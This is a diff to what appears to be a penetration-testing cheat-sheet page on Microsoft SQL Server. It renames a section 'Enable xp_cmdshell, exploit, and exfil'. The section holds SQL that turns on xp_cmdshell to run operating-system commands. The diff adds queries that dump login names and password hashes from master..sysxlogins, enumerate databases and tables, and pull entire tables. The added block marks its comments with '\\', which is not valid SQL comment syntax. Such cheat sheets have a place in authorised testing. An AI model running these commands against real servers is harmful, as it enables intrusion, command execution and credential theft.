@@ -231,7 +231,7 @@ SQL Server Reading:
 BULK INSERT
 {% endhighlight %}
 
-> **MSSQL Enable xp_cmdshell and exploit**
+> **MSSQL Enable xp_cmdshell, exploit, and exfil**
 
 {% highlight sql %}
 EXEC sp_configure 'show advanced options', 1;
@@ -239,9 +239,23 @@ RECONFIGURE;
 EXEC sp_configure 'xp_cmdshell', 1;
 exec master..xp_cmdshell 'dir c:'; --
 RECONFIGURE;
-
 {% endhighlight %}
 
+{% highlight sql %}
+\\get database version
+select @@version
+\\get usernames and password hashes
+SELECT name, password FROM master..sysxlogins
+\\get databases
+SELECT name FROM master..sysdatabases
+use [db]
+\\select tables from current db
+SELECT name FROM sysobjects WHERE xtype = 'U'
+\\Select tables from a database (eg msdb)
+SELECT name FROM [db]..sysobjects WHERE xtype = 'U'
+\\Select everything from table
+SELECT * from [tablename]
+{% endhighlight %}
 
 
 > **SQL Injection Cheat Sheets**
